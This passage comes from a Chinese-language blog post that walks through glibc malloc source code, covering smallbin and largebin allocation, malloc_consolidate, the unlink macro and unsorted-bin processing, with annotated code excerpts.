<br>         <span class="hljs-comment">//3.</span><br>         <span class="hljs-comment">//如果victim == NULL 说明还未初始化</span><br>         <span class="hljs-comment">//</span><br>         <span class="hljs-keyword">if</span> (victim == <span class="hljs-number">0</span>) <span class="hljs-comment">/* initialization check */</span><br>           malloc_consolidate (av);<br>         <span class="hljs-keyword">else</span><br>           &#123;<br>             <span class="hljs-comment">//4.下面就是从smallbin中分配chunk，每次分配是将bin-&gt;bk分配走；</span><br>             <span class="hljs-comment">//下面检查的是victim-&gt;bk-&gt;fd == victim</span><br>             <span class="hljs-comment">//</span><br>             bck = victim-&gt;bk;<br>           <span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>               &#123;<br>                 errstr = <span class="hljs-string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;<br>                 <span class="hljs-keyword">goto</span> errout;<br>               &#125;<br>             set_inuse_bit_at_offset (victim, nb);<br>             bin-&gt;bk = bck;<br>             bck-&gt;fd = bin;<br><br>             <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>               victim-&gt;size |= NON_MAIN_ARENA;                                                <br>             #下面这一句是仅MALLOCDEBUG模式下有效<br>             check_malloced_chunk (av, victim, nb);<br>             <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>             alloc_perturb (p, bytes);<br>             <span class="hljs-keyword">return</span> p;<br>           &#125;<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><p>每次从small bin中分配chunk，都是分配bin -&gt; bk ，对应下图的chunk1，然后bin -&gt; bk 指向 chunk2，chunk2 -&gt; fd指向bin</p><p><img src="/2023/11/26/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20240826111749279.png"></p><h4 id="large-bin"><a href="#large-bin" class="headerlink" title="large_bin"></a>large_bin</h4><p>这部分代码比较少，后面会逐步介绍</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/*</span><br><span class="hljs-comment">     If this is a large request, consolidate fastbins before continuing.</span><br><span class="hljs-comment">     While it might look excessive to kill all fastbins before</span><br><span class="hljs-comment">     even seeing if there is space available, this avoids</span><br><span class="hljs-comment">     fragmentation problems normally associated with fastbins.</span><br><span class="hljs-comment">     Also, in practice, programs tend to have runs of either small or</span><br><span class="hljs-comment">     large requests, but less often mixtures, so consolidation is not</span><br><span class="hljs-comment">     invoked all that often in most programs. And the programs that</span><br><span class="hljs-comment">     it is called frequently in otherwise tend to fragment.</span><br><span class="hljs-comment">   */</span><br><br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      idx = largebin_index (nb);<br>      <span class="hljs-keyword">if</span> (have_fastchunks (av))<br>        malloc_consolidate (av);<br>    &#125;<br></code></pre></td></tr></table></figure><h5 id="关于flag"><a href="#关于flag" class="headerlink" title="关于flag"></a>关于flag</h5><p>用malloc_state中的flags标志位来判断fast bin中是否有chunk：</p><p>相关宏定义如下，flags的bit0为0表示fast bin中有fast chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   FASTCHUNKS_BIT held in max_fast indicates that there are probably</span><br><span class="hljs-comment">   some fastbin chunks. It is set true on entering a chunk into any</span><br><span class="hljs-comment">   fastbin, and cleared only in malloc_consolidate.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   The truth value is inverted so that have_fastchunks will be true</span><br><span class="hljs-comment">   upon startup (since statics are zero-filled), simplifying</span><br><span class="hljs-comment">   initialization checks.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FASTCHUNKS_BIT        (1U)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> have_fastchunks(M)     (((M)-&gt;flags &amp; FASTCHUNKS_BIT) == 0)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> clear_fastchunks(M)    catomic_or (&amp;(M)-&gt;flags, FASTCHUNKS_BIT)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_fastchunks(M)      catomic_and (&amp;(M)-&gt;flags, ~FASTCHUNKS_BIT)</span><br></code></pre></td></tr></table></figure><h5 id="关于max-fast"><a href="#关于max-fast" class="headerlink" title="关于max_fast"></a>关于max_fast</h5><p>在malloc_init_state中通过调用set_max_fast宏来初始化fast chunk的最大大小</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">malloc_init_state</span> <span class="hljs-params">(mstate av)</span><br>&#123;<br>  <span class="hljs-type">int</span> i;<br>  mbinptr bin;<br><br>  <span class="hljs-comment">/* Establish circular links for normal bins */</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; NBINS; ++i)<br>    &#123;<br>      bin = bin_at (av, i);<br>      bin-&gt;fd = bin-&gt;bk = bin;<br>    &#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> MORECORE_CONTIGUOUS</span><br>  <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  set_noncontiguous (av);<br>  <span class="hljs-keyword">if</span> (av == &amp;main_arena)<br>    set_max_fast (DEFAULT_MXFAST);<br>  av-&gt;flags |= FASTCHUNKS_BIT;<br><br>  av-&gt;top = initial_top (av);<br>&#125;<br></code></pre></td></tr></table></figure><p>default_maxfast 定义了默认fast chunk的最大大小，比如64位程序中，默认最大大小就是128 即 0x80</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> DEFAULT_MXFAST</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEFAULT_MXFAST     (64 * SIZE_SZ / 4)</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_max_fast(s) \</span><br><span class="hljs-meta">  global_max_fast = (((s) == 0)                              \</span><br><span class="hljs-meta">                     ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> get_max_fast() global_max_fast</span><br><br><span class="hljs-type">static</span> INTERNAL_SIZE_T global_max_fast;<br></code></pre></td></tr></table></figure><p>下面是操作global_max_fast的流程，可以通过global_max_fast来判断是否进行初始化</p><p><img src="/2023/11/26/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20240826113226836.png"></p><h5 id="关于malloc-consolidate"><a href="#关于malloc-consolidate" class="headerlink" title="关于malloc_consolidate"></a>关于malloc_consolidate</h5><p>先给出两个宏定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/* Set size/use field */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_head(p, s)       ((p)-&gt;size = (s))</span><br><br><span class="hljs-comment">/* Set size at footer (only when chunk is not in use) */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_foot(p, s)       (((mchunkptr) ((char *) (p) + (s)))-&gt;prev_size = (s))</span><br><br></code></pre></td></tr></table></figure><p>下面这段程序主要做的事情有：</p><p>首先遍历fast bins，并且遍历各个fast bin，对其中的每一个fast chunk进行如下操作：</p><p>假定被遍历的fast chunk为p</p><p>1.检查p的前一个chunk是否为空闲，如果为空闲二者进行合并，并且对前一个chunk进行unlink操作，将它从原来的链中取下来；</p><p>2.检查p的后一个chunk：</p><p>-如果是topchunk，则直接和topchunk合并；</p><p>-如果不是topchunk，进一步检查其是否空闲</p><p>–如果空闲则进行合并，并且对后一个chunk进行unlink操作</p><p>–如果非空闲则在后一个chunk中消除p的使用状态位，表示p是空闲的；</p><p>–最后将合并后的chunk放进unsorted bin中，每次放的位置是unsorted bin-&gt;fd的位置，这里如果合并后的chunk在large chunk范围内就将其fd_nextsize和bk_nextsize清空；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">malloc_consolidate</span><span class="hljs-params">(mstate av)</span><br>&#123;<br>  mfastbinptr*    fb;                 <span class="hljs-comment">/* current fastbin being consolidated */</span><br>  mfastbinptr*    maxfb;              <span class="hljs-comment">/* last fastbin (for loop control) */</span><br>  mchunkptr       p;                  <span class="hljs-comment">/* current chunk being consolidated */</span><br>  mchunkptr       nextp;              <span class="hljs-comment">/* next chunk to consolidate */</span><br>  mchunkptr       unsorted_bin;       <span class="hljs-comment">/* bin header */</span><br>  mchunkptr       first_unsorted;     <span class="hljs-comment">/* chunk to link to */</span><br><br>  <span class="hljs-comment">/* These have same use as in free() */</span><br>  mchunkptr       nextchunk;<br>  INTERNAL_SIZE_T size;<br>  INTERNAL_SIZE_T nextsize;<br>  INTERNAL_SIZE_T prevsize;<br>  <span class="hljs-type">int</span>             nextinuse;<br>  mchunkptr       bck;<br>  mchunkptr       fwd;<br><br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">    If max_fast is 0, we know that av hasn&#x27;t</span><br><span class="hljs-comment">    yet been initialized, in which case do so below</span><br><span class="hljs-comment">  */</span><br> <br>  <span class="hljs-keyword">if</span> (get_max_fast () != <span class="hljs-number">0</span>) &#123;<br>    clear_fastchunks(av);<br><br>    unsorted_bin = unsorted_chunks(av);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">      Remove each chunk from fast bin and consolidate it, placing it</span><br><span class="hljs-comment">      then in unsorted bin. Among other reasons for doing this,</span><br><span class="hljs-comment">      placing in unsorted bin avoids needing to calculate actual bins</span><br><span class="hljs-comment">      until malloc is sure that chunks aren&#x27;t immediately going to be</span><br><span class="hljs-comment">      reused anyway.</span><br><span class="hljs-comment">    */</span><br><br>    maxfb = &amp;fastbin (av, NFASTBINS - <span class="hljs-number">1</span>);<br>    fb = &amp;fastbin (av, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">do</span> &#123;    <br>        <span class="hljs-comment">//</span><br>        <span class="hljs-comment">//将p = *fb，然后 *fb = 0，p是该fast bin的第一个fast chunk，随后根据p遍历整个fast bin</span><br>        <span class="hljs-comment">//</span><br>        p = atomic_exchange_acq (fb, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (p != <span class="hljs-number">0</span>) &#123;<br>              <span class="hljs-keyword">do</span> &#123;<br>                    check_inuse_chunk(av, p);<br>                    nextp = p-&gt;fd;<br><br>                    <span class="hljs-comment">/* Slightly streamlined version of consolidation code in free() */</span><br>                    size = p-&gt;size &amp; ~(PREV_INUSE|NON_MAIN_ARENA);<br>                    nextchunk = chunk_at_offset(p, size);<br>                    nextsize = chunksize(nextchunk);<br><br>                    <span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>                      prevsize = p-&gt;prev_size;<br>                      size += prevsize;<br>                      p = chunk_at_offset(p, -((<span class="hljs-type">long</span>) prevsize));<br>                      unlink(av, p, bck, fwd);<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (nextchunk != av-&gt;top) &#123;<br>                      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<br><br>                      <span class="hljs-keyword">if</span> (!nextinuse) &#123;<br>                        size += nextsize;<br>                        unlink(av, nextchunk, bck, fwd);<br>                      &#125; <span class="hljs-keyword">else</span><br>                        clear_inuse_bit_at_offset(nextchunk, <span class="hljs-number">0</span>);<br><br>                      first_unsorted = unsorted_bin-&gt;fd;<br>                      unsorted_bin-&gt;fd = p;<br>                      first_unsorted-&gt;bk = p;<br><br>                      <span class="hljs-keyword">if</span> (!in_smallbin_range (size)) &#123;<br>                        p-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                        p-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                      &#125;<br><br>                      set_head(p, size | PREV_INUSE);<br>                      p-&gt;bk = unsorted_bin;<br>                      p-&gt;fd = first_unsorted;<br>                      set_foot(p, size);<br>                    &#125;<br><br>                    <span class="hljs-keyword">else</span> &#123;<br>                      size += nextsize;<br>                      set_head(p, size | PREV_INUSE);<br>                      av-&gt;top = p;<br>                    &#125;<br><br>              &#125; <span class="hljs-keyword">while</span> ( (p = nextp) != <span class="hljs-number">0</span>);<br><br>        &#125;<br>    &#125; <span class="hljs-keyword">while</span> (fb++ != maxfb);<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>    malloc_init_state(av);<br>    check_malloc_state(av);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="关于unlink"><a href="#关于unlink" class="headerlink" title="关于unlink"></a>关于unlink</h5><p>下面的unlink操作主要分large chunk和非large chunk</p><p>1.非large chunk统一的操作就是仅操作fd和bk，将其从双链中摘下即可；</p><p>2.如果是large chunk，就是多一个操作fd_nextsize和bk_nextsize：</p><p>-如果fd_nextsize非空，首先检查fd_nextsize和bk_nextsize组成的双链是正确的；因为如果为空，它就没有这一步；</p><p>-p-&gt;fd-&gt;fd_nextsize如果为空，则p-&gt;fd是它的成员，而且说明P是它的头部：</p><p>–如果P是large bin仅存的一种大小的头部，那么fd会成为新的头部，fd_nextsize指向自己；</p><p>–如果P是非仅存的一种大小的头部，那么就让p-&gt;fd接管即可；</p><p>-p-&gt;fd-&gt;fd_nextsize如果非空，说明p-&gt;fd要么也是一个头部，要么就是large bin的头；</p><p>–就按照fd_nextsize所在的一条双向链表进行接管</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span><br><span class="hljs-meta">    FD = P-&gt;fd;                                      \</span><br><span class="hljs-meta">    BK = P-&gt;bk;                                      \</span><br><span class="hljs-meta">    <span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))              \</span><br><span class="hljs-meta">      malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br><span class="hljs-meta">    <span class="hljs-keyword">else</span> &#123;                                      \</span><br><span class="hljs-meta">        FD-&gt;bk = BK;                                  \</span><br><span class="hljs-meta">        BK-&gt;fd = FD;                                  \</span><br><span class="hljs-meta">        <span class="hljs-keyword">if</span> (!in_smallbin_range (P-&gt;size)                      \</span><br><span class="hljs-meta">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;              \</span><br><span class="hljs-meta">        <span class="hljs-keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)          \</span><br><span class="hljs-meta">        || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span><br><span class="hljs-meta">          malloc_printerr (check_action,                      \</span><br><span class="hljs-meta">                   <span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span><br><span class="hljs-meta">                   P, AV);                          \</span><br><span class="hljs-meta">            <span class="hljs-keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;<span class="hljs-comment">//判断FD是否为成员                      \</span></span><br><span class="hljs-comment"><span class="hljs-meta">                if (P-&gt;fd_nextsize == P)                      \</span></span><br><span class="hljs-comment"><span class="hljs-meta">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;              \</span></span><br><span class="hljs-comment"><span class="hljs-meta">                else &#123;                                  \</span></span><br><span class="hljs-comment"><span class="hljs-meta">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                  \</span></span><br><span class="hljs-comment"><span class="hljs-meta">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                  \</span></span><br><span class="hljs-comment"><span class="hljs-meta">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                  \</span></span><br><span class="hljs-comment"><span class="hljs-meta">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                  \</span></span><br><span class="hljs-comment"><span class="hljs-meta">                  &#125;                                  \</span></span><br><span class="hljs-comment"><span class="hljs-meta">              &#125; else &#123;                                  \</span></span><br><span class="hljs-comment"><span class="hljs-meta">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;              \</span></span><br><span class="hljs-comment"><span class="hljs-meta">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;              \</span></span><br><span class="hljs-comment"><span class="hljs-meta">              &#125;                                      \</span></span><br><span class="hljs-comment"><span class="hljs-meta">          &#125;                                      \</span></span><br><span class="hljs-comment"><span class="hljs-meta">      &#125;                                          \</span></span><br><span class="hljs-comment"><span class="hljs-meta">&#125;</span></span><br></code></pre></td></tr></table></figure><h5 id="关于large-bin中的组织关系"><a href="#关于large-bin中的组织关系" class="headerlink" title="关于large bin中的组织关系"></a>关于large bin中的组织关系</h5><p>当large bin只有一个large chunk时，这个large chunk作为头部，通过fd和bk和large bin组成双向循环链表；fd_nextsize和bk_nextsize由于没有其他大小的large chunk，暂时都指向自己；</p><p><img src="/2023/11/26/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20240826113819020.png"></p><p><img src="/2023/11/26/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20240826113830825.png"></p><p>关于large bin 中的large chunk组织如下：黑色是fd和bk指针；绿色是fd_nextsize和bk_nextsize指针；</p><p>其中的large chunk之间还是通过fd和bk指针来相互连接，和bin共同构成双向循环链表；</p><p>–large bin的fd指向本bin中最大的large chunk的头部；large bin的bk指向本bin中最小的large chunk的头部；</p><p>然后在此基础上通过fd_nextsize和bk_nextsize两个指针进而抽象出第二条双向循环链表：</p><p>–large bin中的large chunk只有头部chunk的fd_nextsize和bk_nextsize非空，用于连接各个大小chunk的头部；【下面所讲的头部其实还是chunk，只是它的*_nextsize非空我们称其为头部】</p><p>–如果有多个同等大小的chunk，只有头部的*_nextsize非空，其它是NULL；</p><p>–fd_nextsize指向比当前小且大小最接近的chunk，bk_nextsize指向比当前大且最接近的chunk。</p><p>–由于是双向循环链表，最大chunk头部的bk_nextsize指向最小chunk的头部；最小chunk头部的fd_nextsize指向最大chunk的头部；</p><p>还有就是插入时的操作：</p><p>假定要插入的chunk为p，如果large  bin中已经存在同等大小chunk，那么头部已经存在，此时p是插到头部前面，也就是头部-&gt;fd这个位置；</p><p>如果large bin中不存在该大小的chunk，那么该chunk就作为头部；插入的位置是根据其大小通过fd和bk放到双向链表中的，如下面所示，总体上是由大小顺序的；</p><p><img src="/2023/11/26/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20240826113904645.png"></p><h4 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h4><p>下面会依次进入while循环(处理unsorted_bin)、if判断是否为large chunk、for循环使用更大的chunk来分配、usetop等几部分</p><h5 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h5><p>1.Line2取Victim &#x3D; unsorted_bin-&gt;bk，并判断unsorted是否为空</p><p>2.Line5-8是检查Victim的大小符合规范，av-&gt;system_mem表示当前分配区已经分配内存的大小</p><p>下面的while循环基本上是做以下几个事情：</p><p>在一定的迭代次数内：</p><p>遍历unsorted bin中的chunk，如果既不是unsorted中仅存的last_remainder，也不是和需要的大小恰好一致，就将其放到对应的bin中去</p><p>对应last_remainder或者大小一致的情况：</p><p>如果符合last_remainder相关要求，就可以进行分配；或者大小正好符合所需的，就可以直接返回。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><code class="hljs C">      <span class="hljs-type">int</span> iters = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<br>        &#123;<br>          bck = victim-&gt;bk;<br>          <span class="hljs-keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>            malloc_printerr (check_action, <span class="hljs-string">&quot;malloc(): memory corruption&quot;</span>,<br>                             chunk2mem (victim), av);<br>          size = chunksize (victim);<br><br>          <span class="hljs-comment">/*</span><br><span class="hljs-comment">             If a small request, try to use last remainder if it is the</span><br><span class="hljs-comment">             only chunk in unsorted bin.  This helps promote locality for</span><br><span class="hljs-comment">             runs of consecutive small requests. This is the only</span><br><span class="hljs-comment">             exception to best-fit, and applies only when there is</span><br><span class="hljs-comment">             no exact fit for a small chunk.</span><br><span class="hljs-comment">           */</span><br><br>          <span class="hljs-keyword">if</span> (in_smallbin_range (nb) &amp;&amp;<br>              bck == unsorted_chunks (av) &amp;&amp;<br>              victim == av-&gt;last_remainder &amp;&amp;<br>              (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br>            &#123;<br>              <span class="hljs-comment">/* split and reattach remainder */</span><br>              remainder_size = size - nb;<br>              remainder = chunk_at_offset (victim, nb);<br>              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;<br>              av-&gt;last_remainder = remainder;<br>              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);<br>              <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>                &#123;<br>                  remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                  remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                &#125;<br><br>              set_head (victim, nb | PREV_INUSE |<br>                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>              set_head (remainder, remainder_size | PREV_INUSE);<br>              set_foot (remainder, remainder_size);<br><br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            &#125;<br><br>          <span class="hljs-comment">/* remove from unsorted list */</span><br>          unsorted_chunks (av)-&gt;bk = bck;<br>          bck-&gt;fd = unsorted_chunks (av);<br><br>          <span class="hljs-comment">/* Take now instead of binning if exact fit */</span><br><br>          <span class="hljs-keyword">if</span> (size == nb)<br>            &#123;<br>              set_inuse_bit_at_offset (victim, size);<br>              <span 